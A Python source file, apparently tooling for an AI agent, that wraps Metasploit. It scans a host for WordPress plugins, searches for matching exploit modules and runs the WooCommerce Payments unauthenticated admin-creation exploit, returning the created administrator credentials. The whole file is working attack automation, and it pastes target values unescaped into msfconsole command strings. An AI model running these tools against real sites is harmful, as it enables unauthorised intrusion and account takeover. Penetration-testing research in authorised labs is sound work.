import re
import subprocess
from contextlib import AsyncExitStack

from google.adk.tools.mcp_tool import MCPTool, MCPToolset
from google.adk.tools.mcp_tool.mcp_session_manager import SseServerParams


async def create_metasploit_tools() -> tuple[list[MCPTool], AsyncExitStack]:
    return await MCPToolset.from_server(
        connection_params=SseServerParams(
            url="http://localhost:8085/sse",
        ),
    )


def msf_scan_wordpress_plugins(
    target_host: str,
    target_port: int,
    targeturi: str = "/",
) -> list[str]:
    """WordPressのプラグインリストを取得する。

    Parameters:
        target_host (str): スキャン対象のホスト (例: '127.0.0.1')
        target_port (int): 対象ホストのポート番号 (例: 80)
        targeturi (str): WordPressのベースパス (デフォルト: '/')

    Returns:
        list[str]: プラグインのリスト
            例: ['woocommerce-payments']
    """

    cmd = ["msfconsole", "-q", "-x", f"use auxiliary/scanner/http/wordpress_scanner; set RHOSTS {target_host}; set RPORT {target_port}; set TARGETURI {targeturi}; run; exit"]
    res = subprocess.run(cmd, capture_output=True, text=True, check=True)
    plugins = re.findall(r"Detected plugin: (.+) version .+", res.stdout)
    return list(set(plugins))


def msf_search_wordpress_exploit_module(plugin_name: str) -> str:
    """
    WordPress プラグインの攻撃モジュールを検索する。

    Parameters:
        plugin_name (str): 検索対象のプラグイン名

    ## 戻り値

    ### モジュールが見つかった場合

    ```
    Matching Modules
    ================

       #  Name                                                     Disclosure Date  Rank    Check  Description
       -  ----                                                     ---------------  ----    -----  -----------
       0  auxiliary/scanner/http/wp_woocommerce_payments_add_user  2023-03-22       normal  Yes    Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation


    Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_woocommerce_payments_add_user
    ```

    ### モジュールが見つからなかった場合

    ```
    This copy of metasploit-framework is more than two weeks old.
     Consider running 'msfupdate' to update to the latest version.
    [-] No results from search
    ```
    """

    cmd = ["msfconsole", "-q", "-x", f"search wordpress {plugin_name}; exit"]
    return subprocess.run(cmd, capture_output=True, text=True, check=True).stdout


def msf_exploit_wp_woocommerce_payments_add_user(
    target_host: str,
    target_port: int,
    targeturi: str = "/",
) -> str:
    """
    WordPress WooCommerce Payments プラグインの脆弱性を利用して、管理者ユーザを作成する。

    :param target_host: スキャン対象のホスト (例: '127.0.0.1')
    :param target_port: 対象ホストのポート番号 (例: 80)
    :param targeturi: WordPressのベースパス (デフォルト: '/')
    :return:
        - 作成されたユーザ名/パスワード (format: `username:password`)
        - 作成失敗した場合は、空文字列を返す
    """

    cmd = ["msfconsole", "-q", "-x", f"use scanner/http/wp_woocommerce_payments_add_user; set RHOSTS {target_host}; set RPORT {target_port}; set TARGETURI {targeturi}; run; exit"]
    res = subprocess.run(cmd, capture_output=True, text=True, check=True)
    # find one
    userpass = re.findall(r"administrator user -> (.+:.+)", res.stdout)
    if len(userpass) == 0:
        return ""
    return userpass[0]


# metasploit client の使い方を調べるのが面倒だったので、今は subprocess でサボっている。
# def run_metasploit_wordpress_scanner(target_host: str, target_port: int, targeturi: str = "/"):
#     """
#     Metasploitのwordpress_scannerモジュールを実行する関数。
#
#     Parameters:
#     - target_host (str): スキャン対象のホスト (例: '127.0.0.1')
#     - target_port (int): 対象ホストのポート番号 (例: 80)
#     - targeturi (str): WordPressのベースパス (デフォルト: '/')
#
#     Returns:
#     - dict: スキャン結果の辞書
#     """
#
#     client = create_metasploit_client()
#     scanner = client.modules.use("auxiliary", "scanner/http/wordpress_scanner")
#
#     scanner["RHOSTS"] = target_host
#     scanner["RPORT"] = target_port
#     scanner["TARGETURI"] = targeturi
#
#     job_id = scanner.execute()
#
#     # ジョブの完了を待機
#     while client.jobs.list:
#         pass
#     return {"status": "completed", "job_id": job_id}
